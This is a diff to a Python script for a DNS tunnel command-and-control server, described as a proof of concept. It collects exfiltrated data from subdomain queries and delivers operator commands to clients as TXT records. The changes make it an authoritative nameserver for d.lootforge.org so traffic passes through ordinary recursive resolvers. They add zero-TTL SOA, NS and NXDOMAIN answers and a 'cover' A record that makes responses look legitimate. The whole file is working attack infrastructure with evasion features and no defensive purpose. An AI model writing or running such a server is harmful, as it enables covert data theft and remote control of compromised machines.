@@ -1,24 +1,25 @@
 #!/usr/bin/env python3
 """
 DNS Tunnel Server - PoC
+Authoritative nameserver for d.lootforge.org.
 Receives exfiltrated data from DNS subdomain queries.
 Delivers operator commands as TXT record responses.
 
 Setup:
   - Run with root / Administrator privileges (requires UDP/53).
   - Open UDP port 53 inbound on the host firewall.
-  - Point the client's DNS_SERVER setting to this machine's IP.
+  - lootforge.org NS delegation must point d.lootforge.org to cwmkeg.lootforge.org (this server's IP).
   - Windows: install Npcap (https://npcap.com) before running.
 
 Received data is appended to OUTPUT_FILE with a timestamp.
 Type a command at the console prompt to queue it for the client.
 Type 'clear' to cancel any pending command.
 
-Data query format (client → server):
-  <b32chunk>.<seq>.<total>.<sessionid>.d.cwmkaeg.duckdns.org
+Data query format (routed recursively through the DNS hierarchy):
+  <b32chunk>.<seq>.<total>.<sessionid>.d.lootforge.org  (A query)
 
-Command query format (client → server):
-  command.cwmkaeg.duckdns.org  (TXT query)
+Command query format:
+  command.d.lootforge.org  (TXT query)
   Server response TXT: base32-encoded command, or literal "NONE"
 """
 
@@ -29,12 +30,15 @@ import sys
 import threading
 
 from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
+from scapy.layers.dns import DNSRRSOA
 from scapy.packet import NoPayload
 
 # ---------------------------------------------------------------------------
 # Configuration
 # ---------------------------------------------------------------------------
-DOMAIN      = "cwmkaeg.duckdns.org"
+VERSION     = "v2.0"
+DOMAIN      = "d.lootforge.org"
+NS_HOST     = "cwmkeg.lootforge.org"   # must match the NS glue record in lootforge.org
 OUTPUT_FILE = "exfiltrated.txt"
 
 conf.verb = 0  # suppress Scapy noise
@@ -44,10 +48,10 @@ conf.verb = 0  # suppress Scapy noise
 # Shared mutable state (protected by locks)
 # ---------------------------------------------------------------------------
 _state_lock   = threading.Lock()
-_state        = {"command": "NONE"}          # current queued command
+_state        = {"command": "NONE"}
 
 _session_lock = threading.Lock()
-_sessions     = {}                            # sid -> {"chunks": {idx: bytes}, "total": int}
+_sessions     = {}                        # sid -> {"chunks": {idx: str}, "total": int}
 
 
 # ---------------------------------------------------------------------------
@@ -69,7 +73,6 @@ def _b32enc(s: str) -> bytes:
 # ---------------------------------------------------------------------------
 
 def _notify(msg: str) -> None:
-    """Print a highlighted notification without clobbering the input prompt."""
     print(f"\n{'=' * 60}")
     print(msg)
     print("=" * 60)
@@ -77,7 +80,6 @@ def _notify(msg: str) -> None:
 
 
 def _save(session_id: str, raw: bytes) -> None:
-    """Decode and persist a fully-reassembled session payload."""
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
         text = raw.decode("utf-8")
@@ -96,66 +98,112 @@ def _save(session_id: str, raw: bytes) -> None:
 
 
 # ---------------------------------------------------------------------------
-# DNS packet helpers
+# DNS response builders
 # ---------------------------------------------------------------------------
 
-def _make_txt_response(req, txt: bytes):
-    """Build a DNS TXT response packet for an incoming query packet."""
+def _soa_rr(rrname: bytes) -> DNSRRSOA:
+    """SOA record for the zone. TTL=0 prevents recursive resolvers from caching."""
+    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
+    return DNSRRSOA(
+        rrname=rrname,
+        ttl=0,
+        mname=(NS_HOST + ".").encode(),
+        rname=("hostmaster." + DOMAIN + ".").encode(),
+        serial=serial,
+        refresh=3600,
+        retry=900,
+        expire=604800,
+        minimum=0,
+    )
+
+
+def _opt_rr() -> DNSRR:
+    """Minimal EDNS0 OPT record — advertises 4096-byte UDP payload support.
+    Recursive resolvers include OPT in forwarded queries; echoing one back
+    keeps the exchange RFC-compliant."""
+    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")
+
+
+def _wrap(req, dns_layer):
+    """Wrap a DNS response layer in the correct IP/UDP return envelope."""
     return (
         IP(dst=req[IP].src, src=req[IP].dst)
         / UDP(dport=req[UDP].sport, sport=53)
-        / DNS(
-            id=req[DNS].id,
-            qr=1, aa=1, rd=0,
-            qd=req[DNS].qd,
-            an=DNSRR(
-                rrname=req[DNS].qd.qname,
-                type="TXT",
-                ttl=60,
-                rdata=txt,
-            ),
-        )
+        / dns_layer
     )
+
+
+def _make_soa_response(req):
+    zone = (DOMAIN + ".").encode()
+    return _wrap(req, DNS(
+        id=req[DNS].id, qr=1, aa=1, rd=0,
+        qd=req[DNS].qd,
+        an=_soa_rr(zone),
+        ar=_opt_rr(),
+    ))
+
+
+def _make_ns_response(req):
+    zone = (DOMAIN + ".").encode()
+    return _wrap(req, DNS(
+        id=req[DNS].id, qr=1, aa=1, rd=0,
+        qd=req[DNS].qd,
+        an=DNSRR(rrname=zone, type="NS", ttl=0, rdata=(NS_HOST + ".").encode()),
+        ar=_opt_rr(),
+    ))
 
 
 def _make_a_response(req):
-    """Build a minimal DNS A response (acknowledgment for data queries)."""
-    return (
-        IP(dst=req[IP].src, src=req[IP].dst)
-        / UDP(dport=req[UDP].sport, sport=53)
-        / DNS(
-            id=req[DNS].id,
-            qr=1, aa=1, rd=0,
-            qd=req[DNS].qd,
-            an=DNSRR(
-                rrname=req[DNS].qd.qname,
-                type="A",
-                ttl=60,
-                rdata="127.0.0.1",
-            ),
-        )
-    )
+    """A record for data tunnel queries. Returns our own public IP (req[IP].dst)
+    so the answer looks like a real host record rather than a loopback stub."""
+    cover_ip = req[IP].dst
+    return _wrap(req, DNS(
+        id=req[DNS].id, qr=1, aa=1, rd=0,
+        qd=req[DNS].qd,
+        an=DNSRR(rrname=req[DNS].qd.qname, type="A", ttl=0, rdata=cover_ip),
+        ar=_opt_rr(),
+    ))
+
+
+def _make_txt_response(req, txt: bytes):
+    return _wrap(req, DNS(
+        id=req[DNS].id, qr=1, aa=1, rd=0,
+        qd=req[DNS].qd,
+        an=DNSRR(rrname=req[DNS].qd.qname, type="TXT", ttl=0, rdata=txt),
+        ar=_opt_rr(),
+    ))
+
+
+def _make_nxdomain_response(req):
+    """RFC 2308: NXDOMAIN must include a SOA in the authority section so
+    resolvers know the negative TTL and don't retry indefinitely."""
+    zone = (DOMAIN + ".").encode()
+    return _wrap(req, DNS(
+        id=req[DNS].id, qr=1, aa=1, rd=0, rcode=3,
+        qd=req[DNS].qd,
+        ns=_soa_rr(zone),
+        ar=_opt_rr(),
+    ))
 
 
 # ---------------------------------------------------------------------------
 # Data reassembly
 # ---------------------------------------------------------------------------
 
-def _handle_data_query(sub_labels: list[str], src_ip: str) -> bool:
+def _handle_data_query(sub_labels: list, src_ip: str) -> bool:
     """
     Parse a data-exfiltration sub-label list and accumulate chunks.
-    sub_labels is the portion of the FQDN before the base domain, e.g.:
-      ['<b32chunk>', '<seq>', '<total>', '<sessionid>', 'd']
-    Returns True if the format matched (even if decode failed).
+    Expected format: ['<b32chunk>', '<seq>', '<total>', '<sessionid>']
+    Returns True if the format matched (even on decode error).
     """
-    if len(sub_labels) < 5 or sub_labels[-1] != "d":
+    if len(sub_labels) < 4:
         return False
 
-    session_id = sub_labels[-2]
+    session_id = sub_labels[-1]
     try:
-        total    = int(sub_labels[-3])
-        idx      = int(sub_labels[-4])
-        raw_b32  = sub_labels[-5]
+        total   = int(sub_labels[-2])
+        idx     = int(sub_labels[-3])
+        raw_b32 = sub_labels[-4]
     except (ValueError, IndexError):
         return False
 
@@ -164,9 +212,8 @@ def _handle_data_query(sub_labels: list[str], src_ip: str) -> bool:
             _sessions[session_id] = {"chunks": {}, "total": total}
             print(f"\n[+] New session {session_id} from {src_ip} ({total} chunk(s) expected)")
 
-        # Store the raw base32 string, not decoded bytes.
-        # The full base32 stream is split across chunks at arbitrary offsets,
-        # so each chunk is not independently decodable — join first, decode once.
+        # Store raw base32 strings — join the full stream and decode once at
+        # the end to avoid boundary misalignment across 50-char chunk splits.
         _sessions[session_id]["chunks"][idx] = raw_b32
         received = len(_sessions[session_id]["chunks"])
 
@@ -196,35 +243,39 @@ _DOMAIN_LEN    = len(_DOMAIN_LABELS)
 
 
 def _dns_handler(pkt) -> None:
-    # Only process DNS queries
     if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
         return
     dns = pkt[DNS]
     if dns.qr != 0 or dns.qdcount == 0:
         return
 
-    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".")
+    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".").lower()
+    qtype = dns.qd.qtype
 
-    # Ignore queries outside our domain
-    if not qname.endswith(DOMAIN):
+    # Use "." + DOMAIN to avoid prefix-matching an unrelated domain
+    # (DNS names are case-insensitive, so compare lowercase)
+    if qname != DOMAIN and not qname.endswith("." + DOMAIN):
         return
 
     labels     = qname.split(".")
-    sub_labels = labels[:-_DOMAIN_LEN]   # strip base domain labels
+    sub_labels = labels[:-_DOMAIN_LEN]
     src_ip     = pkt[IP].src
 
-    print(f"\n[DNS] {src_ip} → {qname}")
+    print(f"\n[DNS] {src_ip} → {qname}  (type={qtype})")
+
+    # --- Zone apex (SOA / NS) ---
+    if not sub_labels:
+        if qtype == 2:    # NS
+            send(_make_ns_response(pkt), verbose=0)
+        else:             # SOA and anything else at the apex
+            send(_make_soa_response(pkt), verbose=0)
+        return
 
     # --- Command query ---
     if sub_labels == ["command"]:
         with _state_lock:
             cmd = _state["command"]
-
-        if cmd == "NONE":
-            txt_payload = b"NONE"
-        else:
-            txt_payload = _b32enc(cmd)
-
+        txt_payload = b"NONE" if cmd == "NONE" else _b32enc(cmd)
         print(f"[CMD] Responding with: {txt_payload.decode()}")
         send(_make_txt_response(pkt, txt_payload), verbose=0)
         return
@@ -234,7 +285,9 @@ def _dns_handler(pkt) -> None:
         send(_make_a_response(pkt), verbose=0)
         return
 
-    print(f"[?]  Unrecognised sub-label pattern: {sub_labels}")
+    # --- Anything else in the zone → NXDOMAIN ---
+    print(f"[?]  Unknown subdomain → NXDOMAIN")
+    send(_make_nxdomain_response(pkt), verbose=0)
 
 
 # ---------------------------------------------------------------------------
@@ -242,7 +295,6 @@ def _dns_handler(pkt) -> None:
 # ---------------------------------------------------------------------------
 
 def _console_loop() -> None:
-    """Read operator commands from stdin and queue them for clients."""
     print("\n[*] Operator console ready.")
     print("    Type a command to queue it for the next client poll.")
     print("    Type 'clear' to remove any pending command.\n")
@@ -275,17 +327,17 @@ def _console_loop() -> None:
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("  DNS Tunnel Server - PoC")
-    print(f"  Domain filter : *.{DOMAIN}")
-    print(f"  Output file   : {OUTPUT_FILE}")
-    print(f"  Listening     : UDP/53 (all interfaces)")
+    print(f"  DNS Tunnel Server - PoC ({VERSION})")
+    print(f"  Zone        : {DOMAIN}")
+    print(f"  NS hostname : {NS_HOST}")
+    print(f"  Output file : {OUTPUT_FILE}")
+    print(f"  Listening   : UDP/53 (all interfaces)")
     print("=" * 60)
 
     threading.Thread(target=_console_loop, daemon=True).start()
 
     # Bind a dummy UDP socket to port 53 so the kernel sees a listener and
-    # does not fire ICMP port-unreachable when Scapy sniffs packets that the
-    # OS stack would otherwise reject.
+    # does not fire ICMP port-unreachable for packets Scapy processes.
     _sink = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     _sink.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
